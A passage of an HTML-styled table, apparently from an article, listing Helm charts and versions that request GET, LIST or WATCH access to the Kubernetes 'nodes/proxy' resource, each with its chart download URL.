left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/fluent/helm-charts/releases/download/fluent-bit-collector-1.0.0-beta.2/fluent-bit-collector-1.0.0-beta.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">gadget/gadget:0.48.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/inspektor-gadget/inspektor-gadget/releases/download/v0.48.0/gadget-0.48.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">gitlab/gitlab-operator:2.8.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://gitlab-charts.s3.amazonaws.com/gitlab-operator-2.8.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">grafana/grafana-agent:0.44.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/grafana/helm-charts/releases/download/grafana-agent-0.44.2/grafana-agent-0.44.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">grafana/grafana-agent-operator:0.5.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/grafana/helm-charts/releases/download/grafana-agent-operator-0.5.2/grafana-agent-operator-0.5.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">grafana/loki:6.51.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/grafana/helm-charts/releases/download/helm-loki-6.51.0/loki-6.51.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">grafana/loki-simple-scalable:1.8.11</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/grafana/helm-charts/releases/download/loki-simple-scalable-1.8.11/loki-simple-scalable-1.8.11.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">grafana/mimir-distributed:6.1.0-weekly.378</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/grafana/helm-charts/releases/download/mimir-distributed-6.1.0-weekly.378/mimir-distributed-6.1.0-weekly.378.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">grafana/promtail:6.17.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/grafana/helm-charts/releases/download/promtail-6.17.1/promtail-6.17.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">grafana/tempo-distributed:1.61.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/grafana/helm-charts/releases/download/tempo-distributed-1.61.0/tempo-distributed-1.61.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">hashicorp/consul:1.9.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://helm.releases.hashicorp.com/consul-1.9.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">influxdata/telegraf-ds:1.1.45</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/influxdata/helm-charts/releases/download/telegraf-ds-1.1.45/telegraf-ds-1.1.45.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">jfrog/runtime-sensors:101.3.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.jfrog.io/artifactory/api/helm/jfrog-charts/sensors/runtime-sensors-101.3.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">kasten/k10:8.5.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.kasten.io/k10-8.5.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">komodor/k8s-watcher:1.18.17</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://helm-charts.komodor.io/k8s-watcher/k8s-watcher-1.18.17.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">komodor/komodor-agent:2.15.4-RC5</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://helm-charts.komodor.io/komodor-agent/komodor-agent-2.15.4-RC5.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">kubecost/cost-analyzer:2.9.6</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://kubecost.github.io/cost-analyzer/cost-analyzer-2.9.6.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">kwatch/kwatch:0.10.3</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://kwatch.dev/charts/kwatch-0.10.3.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">linkerd2/linkerd-viz:30.12.11</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://helm.linkerd.io/stable/linkerd-viz-30.12.11.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">linkerd2-edge/linkerd-viz:2026.1.3</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , 